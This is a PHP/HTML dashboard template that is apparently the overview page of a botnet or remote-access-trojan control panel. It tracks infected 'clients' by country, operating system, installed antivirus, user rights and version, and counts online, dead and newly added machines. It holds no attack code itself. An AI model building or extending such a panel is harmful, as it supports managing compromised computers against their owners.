<?php require_once '../server/db.php'; if ( !isset($_SESSION['user_login']) ) { header('Location: ../'); } ?>

<div class="row ml-0 mb-3">
    
    <div class="col-sm-2">
		<div class="card">
			<div class="card-body">
				<p class="card-subtitle text-secondary text-uppercase small">Top Countries</p>
				<table id="topCountriesTable" class="display table-hover table-striped" cellspacing="0" width="100%">
					<thead class="text-uppercase">
						<tr>
							<th>Country</th>
							<th>Clients</th>
						</tr>
					</thead>
				</table>
			</div>
		</div>
	</div>
	<div class="col-sm-3">
		<div class="card">
			<div class="card-body">
				<p class="card-subtitle text-secondary text-uppercase small">Top Operating Systems</p>
				<table id="topOSTable" class="display table-hover table-striped" cellspacing="0" width="100%">
					<thead class="text-uppercase">
						<tr>
							<th>OS</th>
							<th>Clients</th>
						</tr>
					</thead>
				</table>
			</div>
		</div>
	</div>
	<div class="col-sm-2">
		<div class="card">
			<div class="card-body">
				<p class="card-subtitle text-secondary text-uppercase small">Top Antiviruses</p>
				<table id="topAVTable" class="display table-hover table-striped" cellspacing="0" width="100%">
					<thead class="text-uppercase">
						<tr>
							<th>Antivirus</th>
							<th>Clients</th>
						</tr>
					</thead>
				</table>
			</div>
		</div>
	</div>
    <div class="col-sm-5">
		<div class="card mb-3">
			<div class="card-body">
                <p class="card-subtitle text-secondary text-uppercase small">World Map</p>
				<div class="mapcontainer">
                    <div class="map"><span></span></div>
                    <div class="areaLegend"><span></span></div>
                </div>
			</div>
		</div>
        
        <div class="row ml-0 mb-3">
            <div class="col-sm-3">
                <div class="card ripple interactive hoverable mb-3">
                    <div class="card-body">
                        <p class="card-subtitle text-secondary text-uppercase small">Online</p>
                        <h1 id="online" class="card-title mb-0 font-weight-bold mt-2">0</h1>
                    </div>
                </div>
                <div class="card ripple interactive hoverable">
                    <div class="card-body">
                        <p class="card-subtitle text-secondary text-uppercase small">Dead</p>
                        <h1 id="dead" class="card-title mb-0 font-weight-bold mt-2">0</h1>
                    </div>
                </div>
            </div>
            <div class="col-sm-3">
                <div class="card ripple interactive hoverable mb-3">
                    <div class="card-body">
                        <p class="card-subtitle text-secondary text-uppercase small">Online Today</p>
                        <h1 id="onlineToday" class="card-title mb-0 font-weight-bold mt-2">0</h1>
                    </div>
                </div>
                <div class="card ripple interactive hoverable">
                    <div class="card-body">
                        <p class="card-subtitle text-secondary text-uppercase small">New Today</p>
                        <h1 id="newToday" class="card-title mb-0 font-weight-bold mt-2">0</h1>
                    </div>
                </div>
            </div>
            <div class="col-sm-3">
                <div class="card ripple interactive hoverable mb-3">
                    <div class="card-body">
                        <p class="card-subtitle text-secondary text-uppercase small">Online / Week</p>
                        <h1 id="onlineWeek" class="card-title mb-0 font-weight-bold mt-2">0</h1>
                    </div>
                </div>
                <div class="card ripple interactive hoverable">
                    <div class="card-body">
                        <p class="card-subtitle text-secondary text-uppercase small">New / Week</p>
                        <h1 id="newWeek" class="card-title mb-0 font-weight-bold mt-2">0</h1>
                    </div>
                </div>
            </div>
            <div class="col-sm-3">
                <div class="card ripple interactive hoverable mb-3">
                    <div class="card-body">
                        <p class="card-subtitle text-secondary text-uppercase small">Online / Month</p>
                        <h1 id="onlineMonth" class="card-title mb-0 font-weight-bold mt-2">0</h1>
                    </div>
                </div>
                <div class="card ripple interactive hoverable">
                    <div class="card-body">
                        <p class="card-subtitle text-secondary text-uppercase small">New / Month</p>
                        <h1 id="newMonth" class="card-title mb-0 font-weight-bold mt-2">0</h1>
                    </div>
                </div>
            </div>
        </div>
            
        <div class="row ml-0 mb-3">
            <div class="col-sm-3">
                <div class="card ripple hoverable mb-3">
                    <div class="card-body">
                        <p class="card-subtitle text-secondary text-uppercase small">OS</p>
                        <canvas id="osChart" height="280"></canvas>
                    </div>
                </div>
            </div>
            <div class="col-sm-3">
                <div class="card ripple hoverable mb-3">
                    <div class="card-body">
                        <p class="card-subtitle text-secondary text-uppercase small">Antiviruses</p>
                        <canvas id="avChart" height="280"></canvas>
                    </div>
                </div>
            </div>
            <div class="col-sm-3">
                <div class="card ripple hoverable mb-3">
                    <div class="card-body">
                        <p class="card-subtitle text-secondary text-uppercase small">User Rights</p>
                        <canvas id="rightsChart" height="280"></canvas>
                    </div>
                </div>
            </div>
            <div class="col-sm-3">
                <div class="card ripple hoverable">
                    <div class="card-body">
                        <p class="card-subtitle text-secondary text-uppercase small">Versions</p>
                        <canvas id="verChart" height="280"></canvas>
                    </div>
                </div>
            </div>
        </div>
        
	</div>
	
</div>